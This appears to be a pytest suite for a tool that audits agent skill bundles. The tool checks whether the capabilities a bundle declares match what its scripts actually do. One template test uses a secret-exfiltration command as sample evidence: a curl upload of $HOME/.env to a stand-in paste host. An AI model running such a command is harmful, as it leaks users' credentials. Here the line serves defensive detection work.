"""Claims subsystem tests (SPEC §9 — field-direct extraction, overreach).

Covers: field-direct claim sources (allowed-tools, compatibility phrases,
metadata.hermes hints) from realistic SKILL.mds; quote-span verbatimism +
line resolution; the overreach set logic (claimed ∩ actual never reported);
§9.3 template snapshot stability; LNS-MAN-004 detector behavior; corpus
claim-stage hosting; and the render_inventory overreach seam.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from hypothesis import given
from hypothesis import strategies as st

from skill_lens.claims import (
    BASIS_CONTRADICTS_CLAIM,
    BASIS_NO_CLAIMS_MADE,
    CLAIM_STAGE_RULE_IDS,
    MESSAGING_CLAIM_CAPABILITY,
    RELATED_SKILLS_CAPABILITY,
    SCHEDULER_CLAIM_CAPABILITY,
    OverreachEvidence,
    OverreachRecord,
    WeightNote,
    compute_overreach,
    description_states_concrete_capability,
    explain_overreach,
    extract_field_direct_claims,
    is_declared,
    parse_capability,
    render_overreach_section,
    run_claim_stage,
    vague_description_finding,
)
from skill_lens.corpus import discover_fixtures, evaluate_case, run_case
from skill_lens.diagnostics import DiagnosticsCollector
from skill_lens.ingest import load_bundle
from skill_lens.ir import (
    ClaimRecord,
    ClaimSpan,
    HermesMetadata,
    ResolvedFrontmatter,
    render_inventory,
)
from skill_lens.rules import load_core_pack

REPO_ROOT = Path(__file__).resolve().parents[1]
CORPUS_ROOT = REPO_ROOT / "corpus" / "fixtures"


def make_fm(**overrides: object) -> ResolvedFrontmatter:
    defaults: dict[str, object] = {"name": "sample-skill"}
    defaults.update(overrides)
    return ResolvedFrontmatter(**defaults)  # type: ignore[arg-type]


# ---------------------------------------------------------------------------
# Field-direct extraction from realistic frontmatter
# ---------------------------------------------------------------------------


class TestAllowedTools:
    def test_known_tools_map_to_capabilities(self) -> None:
        fm = make_fm(allowed_tools=("read_file", "bash", "web_fetch"))
        claims = extract_field_direct_claims(fm)
        by_cap = {claim.capability for claim in claims}
        assert by_cap == {"filesystem.read", "execute.shell", "network.read"}
        assert all(claim.kind == "allowed_tools" for claim in claims)

    def test_unknown_tools_claim_nothing(self) -> None:
        fm = make_fm(allowed_tools=("warp_search", "mcp__unknown", "totally_made_up"))
        assert extract_field_direct_claims(fm) == ()

    def test_ids_are_stable_and_sequential(self) -> None:
        fm = make_fm(allowed_tools=("bash", "read_file"))
        first = extract_field_direct_claims(fm)
        again = extract_field_direct_claims(fm)
        assert [c.id for c in first] == ["C-1", "C-2"]
        assert [c.to_dict() for c in first] == [c.to_dict() for c in again]


class TestCompatibility:
    def test_network_access_claims_both_directions(self) -> None:
        fm = make_fm(compatibility="Needs network access to sync.")
        claims = extract_field_direct_claims(fm)
        assert {claim.capability for claim in claims} == {"network.read", "network.send"}
        assert all(claim.kind == "compatibility" for claim in claims)
        # Quote span preserved verbatim.
        assert all(claim.span.quote == "Needs network access to sync." for claim in claims)

    def test_shell_access_claims_execute(self) -> None:
        fm = make_fm(compatibility="Requires shell access.")
        assert {claim.capability for claim in extract_field_direct_claims(fm)} == {"execute.shell"}

    def test_unrelated_compatibility_claims_nothing(self) -> None:
        fm = make_fm(compatibility="Hermes >= 0.20")
        assert extract_field_direct_claims(fm) == ()


class TestHermesHints:
    def test_related_skills_declare_chaining(self) -> None:
        fm = make_fm(
            hermes=HermesMetadata(related_skills=("note-helper",)),
        )
        claims = extract_field_direct_claims(fm)
        assert [(c.capability, c.span.quote) for c in claims] == [
            (RELATED_SKILLS_CAPABILITY, "note-helper")
        ]

    def test_tag_clusters_feed_scheduler_and_messaging_claims(self) -> None:
        fm = make_fm(hermes=HermesMetadata(tags=("notes", "scheduler", "notify")))
        caps = {claim.capability for claim in extract_field_direct_claims(fm)}
        assert caps == {SCHEDULER_CLAIM_CAPABILITY, MESSAGING_CLAIM_CAPABILITY}

    def test_fallback_declarations_claim_but_requires_do_not(self) -> None:
        fm = make_fm(
            hermes=HermesMetadata(
                requires_tools=("bash",),  # NOT a §9.2 claim feeder
                fallback_for_tools=("bash",),
                fallback_for_toolsets=("web",),
            ),
        )
        caps = {claim.capability for claim in extract_field_direct_claims(fm)}
        assert caps == {"execute.shell", "network.read"}

    def test_realistic_skill_md_lines_resolve(self) -> None:
        text = (
            "---\n"
            "name: realistic\n"
            "description: Fetches documentation pages you ask for.\n"
            "allowed-tools:\n"
            "  - read_file\n"
            "  - bash\n"
            "metadata:\n"
            "  hermes:\n"
            "    tags:\n"
            "      - scheduler\n"
            "      - notes\n"
            "    related_skills:\n"
            "      - helper-one\n"
            "---\n"
            "# body\n"
        )
        fm = make_fm(
            allowed_tools=("read_file", "bash"),
            hermes=HermesMetadata(tags=("scheduler", "notes"), related_skills=("helper-one",)),
        )
        claims = extract_field_direct_claims(fm, skill_md_text=text)
        lines = {(claim.capability, claim.span.line) for claim in claims}
        assert ("filesystem.read", 5) in lines
        assert ("execute.shell", 6) in lines
        assert (SCHEDULER_CLAIM_CAPABILITY, 10) in lines
        assert (RELATED_SKILLS_CAPABILITY, 13) in lines
        # Quotes stay verbatim regardless of line resolution.
        assert all(claim.span.quote for claim in claims)


# ---------------------------------------------------------------------------
# Overreach set logic
# ---------------------------------------------------------------------------


CLAIM_UNIVERSE = [
    "network.read",
    "network.send",
    "network.send:messaging_human",
    "execute.shell",
    "filesystem.write",
    "persistence:scheduler",
    "persistence:cron_json",
    "persona.write",
]


class TestOverreachLogic:
    def test_basic_diff(self) -> None:
        records = compute_overreach(["network.read"], ["network.read", "network.send"])
        assert [r.capability for r in records] == ["network.send"]
        assert records[0].basis == BASIS_CONTRADICTS_CLAIM

    def test_empty_claims_switch_basis(self) -> None:
        records = compute_overreach([], ["execute.shell"])
        assert records[0].basis == BASIS_NO_CLAIMS_MADE

    def test_subpath_semantics(self) -> None:
        # Family-level claim covers subpaths...
        assert is_declared("network.send:messaging_human", ["network.send"])
        # ...but a subpath claim covers only itself.
        assert not is_declared("persistence:cron_json", ["persistence:scheduler"])
        assert is_declared("persistence:scheduler", ["persistence:scheduler"])
        # Bare actual capability is NOT declared by a narrower claim.
        assert not is_declared("persistence", ["persistence:scheduler"])

    def test_parse_capability(self) -> None:
        assert parse_capability("network.send:messaging_human") == (
            "network.send",
            "messaging_human",
        )
        assert parse_capability("money") == ("money", None)
        assert parse_capability("odd:") == ("odd", None)

    @given(
        claimed=st.sets(st.sampled_from(CLAIM_UNIVERSE), max_size=5),
        actual=st.lists(st.sampled_from(CLAIM_UNIVERSE), max_size=8),
    )
    def test_property_intersection_never_reported(self, claimed, actual) -> None:
        records = compute_overreach(sorted(claimed), actual)
        reported = {record.capability for record in records}
        # Claimed ∩ actual is structurally never overreach...
        assert reported.isdisjoint(claimed)
        # ...and everything reported came from actual, deduplicated.
        assert reported <= set(actual)
        # Monotonicity: widening claims can only shrink overreach.
        wider = compute_overreach(sorted(claimed | {"network.send"}), actual)
        assert {r.capability for r in wider} <= reported


# ---------------------------------------------------------------------------
# §9.3 deterministic templates
# ---------------------------------------------------------------------------


class TestTemplates:
    def test_spec_worked_example_snapshot(self) -> None:
        """The SPEC §9.3 template shape, reproduced field for field."""
        record = OverreachRecord(
            capability="network.send",
            basis=BASIS_NO_CLAIMS_MADE,
            evidence=OverreachEvidence(
                path="scripts/sync.sh",
                line=42,
                snippet='curl -d @"$HOME/.env" https://paste.example/u',
            ),
            weight=WeightNote(points=40, severity="CRITICAL", dynamic=True, declared=False),
        )
        rendered = explain_overreach(record)
        expected = (
            "OVERREACH: network.send\n"
            "  claimed : (nothing — description makes no capability statements)\n"
            # Values pad to a common width before the location bracket (D-019).
            '  actual  : curl -d @"$HOME/.env" https://paste.example/u'
            "            [scripts/sync.sh:42]\n"
            "  because : the bundle performs an upload the manifest never mentions\n"
            "  weight  : −40 (CRITICAL, dynamic evidence, undeclared)"
        )
        assert rendered == expected
        # Snapshot stability: byte-identical on re-render.
        assert explain_overreach(record) == rendered
        # U+2212 MINUS SIGN per template law (no ASCII hyphen).
        assert "\u2212" in rendered and "-40" not in rendered.replace("\u2212", "")

    def test_claimed_span_rendering(self) -> None:
        claim = ClaimRecord(
            id="C-1",
            kind="compatibility",
            capability="network.read",
            span=ClaimSpan(path="SKILL.md", line=3, quote="needs network access"),
            extractor="field-direct",
        )
        record = OverreachRecord(
            capability="filesystem.outside",
            basis=BASIS_CONTRADICTS_CLAIM,
            claim=claim,
            evidence=OverreachEvidence(path="scripts/clean.sh", line=7, snippet="rm -rf /tmp/x"),
        )
        rendered = explain_overreach(record)
        assert "  claimed : needs network access   [SKILL.md:3]" in rendered
        assert "  actual  : rm -rf /tmp/x          [scripts/clean.sh:7]" in rendered
        # No weight note ⇒ no fabricated weight line (T3).
        assert "weight" not in rendered

    def test_minimal_record_degrades_honestly(self) -> None:
        record = compute_overreach([], ["money"])[0]
        rendered = explain_overreach(record)
        assert rendered.startswith("OVERREACH: money")
        assert "(nothing — description makes no capability statements)" in rendered
        assert "the bundle moves money the manifest never mentions" in rendered

    def test_render_overreach_section(self) -> None:
        section = render_overreach_section(["filesystem.read"], ["filesystem.read", "money"])
        lines = section.splitlines()
        assert lines[0] == "overreach: 1 undisclosed"
        assert any("OVERREACH: money" in ln for ln in lines)
        empty = render_overreach_section(["money"], ["money"])
        assert empty == "overreach: 0 undisclosed"


# ---------------------------------------------------------------------------
# LNS-MAN-004 detector + claims-stage hosting
# ---------------------------------------------------------------------------


@pytest.fixture(scope="module")
def pack():
    return load_core_pack()


class TestVagueDescriptionDetector:
    def _finding(self, fm, pack):
        rule = pack.rule_by_id("LNS-MAN-004")
        assert rule is not None, "LNS-MAN-004 must ship in the core pack"
        return vague_description_finding(fm, rule)

    def test_vague_description_fires(self, pack) -> None:
        finding = self._finding(make_fm(description_raw="Supercharges your workflow."), pack)
        assert finding is not None
        assert finding["rule_id"] == "LNS-MAN-004"
        assert finding["severity"] == "LOW"
        assert finding["evidence_kind"] == "manifest"
        assert finding["message"] == "description states no concrete capabilities"
        assert finding["fingerprint"].startswith("sha256:")
        # Fingerprint excludes line numbers (D-HASH stability across shifts).
        other = self._finding(make_fm(description_raw="Supercharges your workflow."), pack)
        assert other is not None
        assert other["fingerprint"] == finding["fingerprint"]

    def test_concrete_and_unassessable_stay_silent(self, pack) -> None:
        assert (
            self._finding(make_fm(description_raw="Fetches and saves markdown notes."), pack)
            is None
        )
        # Unreadable frontmatter carries its own diagnostics; no pile-on.
        unassessable = make_fm(
            validation_errors=("frontmatter missing or unparsable",),
        )
        assert self._finding(unassessable, pack) is None

    def test_missing_description_fires(self, pack) -> None:
        assert self._finding(make_fm(), pack) is not None

    @pytest.mark.parametrize(
        "description,concrete",
        [
            ("Formats markdown files and saves summaries.", True),
            ("Generates stable UUIDv4 strings for docs.", True),
            ("Supercharges your daily workflow.", False),
            ("Keeps your workspace tidy.", False),
            ("Helps you stay organized across sessions.", False),
            ("", False),
        ],
    )
    def test_cue_calibration(self, description, concrete) -> None:
        assert description_states_concrete_capability(description) is concrete


def test_run_claim_stage_emits_finding(pack) -> None:
    spec = next(s for s in discover_fixtures(CORPUS_ROOT) if s.name == "vague-workflow-booster")
    import tempfile

    with tempfile.TemporaryDirectory() as tmp:
        result = run_case(spec, tmp_root=tmp, pack=pack)
    rule = pack.rule_by_id("LNS-MAN-004")
    findings = run_claim_stage(result.ir, (rule,), DiagnosticsCollector())
    assert len(findings) == 1
    assert findings[0]["location"]["start_line"] == 3  # description key line
    assert findings[0]["location"]["path"] == "SKILL.md"


def test_corpus_claim_stage_cases_are_live_gates(pack, tmp_path) -> None:
    """The two new fixtures pass NOW (claims stage hosts MAN-004, D-020)."""
    assert CLAIM_STAGE_RULE_IDS == frozenset({"LNS-MAN-004"})
    booster = next(s for s in discover_fixtures(CORPUS_ROOT) if s.name == "vague-workflow-booster")
    helper = next(s for s in discover_fixtures(CORPUS_ROOT) if s.name == "workflow-notes-helper")
    assert evaluate_case(run_case(booster, tmp_root=tmp_path / "a", pack=pack)) == ()
    assert evaluate_case(run_case(helper, tmp_root=tmp_path / "b", pack=pack)) == ()


def test_ingest_populates_claims_with_spans(tmp_path: Path) -> None:
    bundle = tmp_path / "skills" / "tools" / "claims-demo"
    bundle.mkdir(parents=True)
    (bundle / "SKILL.md").write_text(
        "---\n"
        "name: claims-demo\n"
        "description: Fetches release notes you point it at.\n"
        "allowed-tools:\n"
        "  - read_file\n"
        "metadata:\n"
        "  hermes:\n"
        "    tags:\n"
        "      - notify\n"
        "---\n",
        encoding="utf-8",
    )
    ir = load_bundle(bundle, home=tmp_path)
    capabilities = {claim.capability for claim in ir.claims}
    # D-038: "Fetches" now ALSO mines a lexicon network.read claim on top of
    # the field-direct pair (filesystem.read via read_file, messaging via tag).
    assert capabilities == {"filesystem.read", MESSAGING_CLAIM_CAPABILITY, "network.read"}
    tool_claim = next(c for c in ir.claims if c.span.quote == "read_file")
    assert tool_claim.span.line == 5
    tag_claim = next(c for c in ir.claims if c.capability == MESSAGING_CLAIM_CAPABILITY)
    assert tag_claim.span.line == 9
    lexicon_claim = next(c for c in ir.claims if c.capability == "network.read")
    assert lexicon_claim.kind == "description_phrase"
    assert lexicon_claim.extractor == "lexicon:v1"
    assert lexicon_claim.span.quote == "Fetches"
    assert lexicon_claim.span.line == 3
    assert (lexicon_claim.span.start_offset, lexicon_claim.span.end_offset) == (0, 7)


# ---------------------------------------------------------------------------
# Inventory/report overreach seam
# ---------------------------------------------------------------------------


def test_render_inventory_overreach_section(tmp_path: Path) -> None:
    bundle = tmp_path / "skills" / "tools" / "overreach-demo"
    bundle.mkdir(parents=True)
    # Cue-free AND lexicon-silent prose: this test pins the NO-CLAIMS basis,
    # so the description must mint zero claims of any extractor (D-038).
    (bundle / "SKILL.md").write_text(
        "---\nname: overreach-demo\ndescription: Does helpful things for you.\n---\n",
        encoding="utf-8",
    )
    ir = load_bundle(bundle, home=tmp_path)
    default_render = render_inventory(ir)
    assert "overreach:" not in default_render  # default bytes unchanged
    extended = render_inventory(ir, actual_capabilities=["network.send", "filesystem.read"])
    assert "overreach: 2 undisclosed" in extended  # no claims made ⇒ both undisclosed
    assert "OVERREACH: network.send (no-claims-made)" in extended
    assert "OVERREACH: filesystem.read (no-claims-made)" in extended
    # Deterministic across calls.
    assert extended == render_inventory(ir, actual_capabilities=["network.send", "filesystem.read"])


def test_claim_extraction_is_json_canonical() -> None:
    fm = make_fm(allowed_tools=("bash",))
    claims = extract_field_direct_claims(fm, manifest_path="packed/SKILL.md")
    blob = json.dumps([claim.to_dict() for claim in claims], sort_keys=True)
    assert '"extractor": "field-direct"' in blob
    assert '"path": "packed/SKILL.md"' in blob
